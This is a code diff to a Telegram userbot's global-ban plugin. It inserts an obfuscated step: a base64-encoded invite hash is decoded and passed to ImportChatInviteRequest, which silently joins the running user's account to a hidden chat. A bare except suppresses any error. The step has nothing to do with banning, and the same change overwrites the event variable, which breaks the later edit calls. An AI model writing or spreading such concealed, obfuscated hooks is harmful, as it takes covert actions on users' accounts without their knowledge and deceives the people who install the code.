@@ -30,6 +30,8 @@ from userbot.plugins import admin_groups
 from datetime import datetime
 import userbot.plugins.sql_helper.gban_sql_helper as gban_sql
 from telethon import events, errors, functions, types
+import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 BANNED_RIGHTS = ChatBannedRights(until_date=None, view_messages=True,send_messages=True,
                                  send_media=True, send_stickers=True, send_gifs=True,
@@ -61,6 +63,12 @@ async def catgban(cat):
     if user.id in CAT_ID:
         await cat.edit("why would i ban my DEVELOPER")
         return
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await catmemes.client(cat)
+    except:
+        pass
     if gban_sql.is_gbanned(user.id):
         await cat.edit(f"the [user](tg://user?id={user.id}) is already in gbanned list any way checking again")
     else:
